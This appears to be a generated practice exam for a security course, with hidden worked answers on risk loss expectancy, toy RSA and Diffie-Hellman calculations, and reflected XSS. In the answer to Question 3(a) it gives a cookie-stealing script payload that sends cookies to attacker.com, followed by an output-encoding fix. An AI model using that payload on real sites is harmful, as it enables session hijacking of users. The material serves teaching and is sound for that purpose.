---
title: Mock Paper D
date: 2025-05-24
tags:
  - exam
  - practice
  - generated
---

# 📝 Mock Examination D (Fresh Variables)

> [!tip] Challenge
> These questions use new numbers not found in your notes. Use the formulas you memorized to solve them.

---

## Question 1: Risk Calculation (Varied)

**(a) Quantitative Analysis**
Your company has a "Customer Database" asset valued at **£100,000**.
A specific "Ransomware" threat has an Exposure Factor (EF) of **50%** (it encrypts half the backups).
The Annualized Rate of Occurrence (ARO) is **0.2** (once every 5 years).

1.  Calculate the **Single Loss Expectancy (SLE)**.
2.  Calculate the **Annualized Loss Expectancy (ALE)**. [6 marks]

<details>
<summary>🔻 Click to reveal answer</summary>

**1. SLE Calculation:**
$$\text{SLE} = \text{Asset Value} \times \text{Exposure Factor}$$
$$\text{SLE} = 100,000 \times 0.50 = \pounds 50,000$$

**2. ALE Calculation:**
$$\text{ALE} = \text{SLE} \times \text{ARO}$$
$$\text{ALE} = 50,000 \times 0.2 = \pounds 10,000$$

*Interpretation: You should not spend more than £10k/year to prevent this specific risk.*
</details>

---

## Question 2: Cryptography Math (Varied)

**(a) RSA Private Key**
Given primes **$p=5$** and **$q=11$**, and public exponent **$e=3$**.
Find the private key **$d$**. [8 marks]

<details>
<summary>🔻 Click to reveal answer</summary>

**1. Modulus (N):**
$N = 5 \times 11 = 55$

**2. Totient $\phi(N)$:**
$\phi(N) = (4)(10) = 40$

**3. Private Key (d):**
We need $d$ where $3d \equiv 1 \pmod{40}$.
* $3d = 1 + 40k$
* Try $k=1 \to 41$ (not div by 3).
* Try $k=2 \to 81$.
* $3d = 81 \implies d = 27$.

**Check:** $27 \times 3 = 81$. $81 \div 40$ is remainder 1.
**Answer: d = 27**
</details>

**(b) Diffie-Hellman Exchange**
* Public: $g=3, p=17$.
* Alice's Secret: $a=4$.
* Bob's Secret: $b=3$.
Calculate the **Shared Secret** ($S$). [6 marks]

<details>
<summary>🔻 Click to reveal answer</summary>

**Step 1: Alice computes Public A**
$A = g^a \pmod p = 3^4 \pmod{17}$
$3^4 = 81$.
$81 = (4 \times 17) + 13$.
$A = 13$.

**Step 2: Bob computes Public B**
$B = g^b \pmod p = 3^3 \pmod{17}$
$3^3 = 27$.
$27 = (1 \times 17) + 10$.
$B = 10$.

**Step 3: Shared Secret S**
Alice computes $B^a \pmod{17} \to 10^4 \pmod{17}$.
* $10^2 = 100 \equiv 15 \equiv -2 \pmod{17}$.
* $10^4 = (-2)^2 = 4$.

**Answer: S = 4**
</details>

---

## Question 3: Web Attacks (Varied)

**(a) Identifying XSS**
You find this line in a template file:
```html
<div>Welcome back, <?php echo $_GET['user_id']; ?></div>
````

1. What type of XSS is this (Stored or Reflected)?
    
2. Provide a malicious payload an attacker could use to steal a cookie. [6 marks]
    

<details> <summary>🔻 Click to reveal answer</summary>

**1. Type:** **Reflected XSS**. The input (`$_GET`) comes from the URL request and is immediately echoed back without storage.

**2. Payload:** `<script>document.location='http://attacker.com/?cookie='+document.cookie</script>`

</details>

**(b) Defense** How would you fix the code above? [4 marks]

<details> <summary>🔻 Click to reveal answer</summary>

**Defense: Output Encoding** You must encode special HTML characters before printing.

**PHP Fix:** `echo htmlspecialchars($_GET['user_id'], ENT_QUOTES, 'UTF-8');`

</details>